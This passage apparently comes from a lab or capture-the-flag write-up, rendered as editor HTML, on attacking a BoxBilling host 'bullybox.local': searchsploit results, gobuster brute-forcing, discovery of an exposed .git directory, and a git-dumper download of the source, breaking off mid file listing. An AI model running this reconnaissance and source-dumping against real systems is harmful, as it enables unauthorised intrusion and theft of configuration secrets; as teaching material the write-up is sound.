CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ searchsploit</span> boxbilling &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Exploit Title &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |  Path</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BoxBilling <span class="cm-number">3</span>.6.11 <span class="cm-attribute">-</span> <span class="cm-string">'mod_notification'</span> Persistent Cross-Site Scripting &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | php/webapps/30083.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BoxBilling&lt;<span class="cm-operator">=</span><span class="cm-number">4</span>.22.1.5 <span class="cm-attribute">-</span> Remote Code Execution (RCE) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | php/webapps/51108.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Shellcodes: No Results</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre><p><span>I then proceeded with further enumeration, ranging from checking </span><code>/robots.txt</code><span> to performing directory brute-forcing with </span><code>gobuster</code><span>. This led to the discovery of a </span><code>/.git</code><span> directory.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># If the BoxBilling site is installed within a folder such as at</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># e.g. www.example.com/boxbilling/ the robots.txt file MUST be</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># moved to the site root at e.g. www.example.com/robots.txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># AND the BoxBilling folder name MUST be prefixed to the disallowed</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># path, e.g. the Disallow rule for the /bb-data/ folder</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># MUST be changed to read Disallow: /boxbilling/bb-data/</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># For more information about the robots.txt standard, see:</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># &lt;http://www.robotstxt.org/orig.html&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># For syntax checking, see:</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># &lt;http://www.sxw.org.uk/computing/robots/check.html&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">User-agent: *</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Disallow: /bb-data/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Disallow: /bb-library/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Disallow: /bb-locale/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Disallow: /bb-modules/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Disallow: /bb-uploads/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Disallow: /bb-vendor/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Disallow: /install/</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 461px;"></div><div class="CodeMirror-gutters" style="display: none; height: 461px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ gobuster</span> dir <span class="cm-attribute">-u</span> &lt;http://bullybox.local&gt; <span class="cm-attribute">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Gobuster v3.6</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Url: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;http://bullybox.local&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Method: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  GET</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Threads: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">10</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Wordlist: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  /usr/share/seclists/Discovery/Web-Content/common.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Negative Status codes: &nbsp; <span class="cm-number">404</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] User Agent: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  gobuster/3.6</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Timeout: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10s</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting gobuster <span class="cm-keyword">in</span> directory enumeration mode</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.git &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">301</span>) [Size: <span class="cm-number">315</span>] [--&gt; &lt;http://bullybox.local/.git/&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.git/HEAD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">23</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.git/config &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">92</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.git/logs/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.hta &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.htaccess &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.htpasswd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/.git/index &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">495864</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[truncated]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/Documents and Settings (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/LICENSE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">11346</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/Program Files &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/_ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">3971</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/about-us &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">9436</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/akeeba.backend.log &nbsp; (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/api/experiments &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">77</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/api/experiments/configurations (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">93</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/balance &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">0</span>] [--&gt; &lt;http://bullybox.local/client/balance&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/blog &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">10663</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/cart &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">9299</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/client &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">3994</span>] [--&gt; &lt;http://bullybox.local/login&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/contact-us &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">11039</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/dashboard &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">13538</span>] [--&gt; &lt;http://bullybox.local/login&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/development.log &nbsp; &nbsp;  (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/email &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">8976</span>] [--&gt; &lt;http://bullybox.local/login&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/emails &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">8976</span>] [--&gt; &lt;http://bullybox.local/login&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/example &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">4185</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/forum &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">9808</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/index.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">10462</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/invoice &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">9558</span>] [--&gt; &lt;http://bullybox.local/login&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/kb &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">9522</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/login &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">14605</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/me &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">0</span>] [--&gt; &lt;http://bullybox.local/client/profile&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/news &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">10663</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/order &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">12532</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/php.ini &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/privacy-policy &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">10669</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/production.log &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/reports list &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/robots.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">716</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/server-status &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/service &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">9188</span>] [--&gt; &lt;http://bullybox.local/login&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/sitemap.xml &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">1719</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/spamlog.log &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">403</span>) [Size: <span class="cm-number">279</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/support &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">302</span>) [Size: <span class="cm-number">11285</span>] [--&gt; &lt;http://bullybox.local/login&gt;]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/tos &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  (Status: <span class="cm-number">200</span>) [Size: <span class="cm-number">10263</span>]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Progress: <span class="cm-number">4746</span> / <span class="cm-number">4747</span> (99.98%)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Finished</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">===============================================================</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1492px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1492px;"></div></div></div></pre><p><span>Using </span><code>git-dumper</code><span>, I dumped the entire Git repository.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">git-dumper &lt;http://bullybox.local&gt; git_directory</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/git_directory]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ ls</span> <span class="cm-attribute">-la</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">total <span class="cm-number">676</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x <span class="cm-number">10</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxr-xr-x &nbsp;<span class="cm-number">6</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:27 ..</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rwxrwxr-x</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp; &nbsp;<span class="cm-number">938</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-config.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp; <span class="cm-number">2881</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-config-sample.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp; <span class="cm-number">1080</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-cron.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x &nbsp;<span class="cm-number">2</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-data</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp;<span class="cm-number">11338</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-di.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp; <span class="cm-number">1843</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-ipn.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x <span class="cm-number">10</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-library</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp;<span class="cm-number">10840</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-load.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x &nbsp;<span class="cm-number">3</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-locale</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x <span class="cm-number">50</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-modules</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 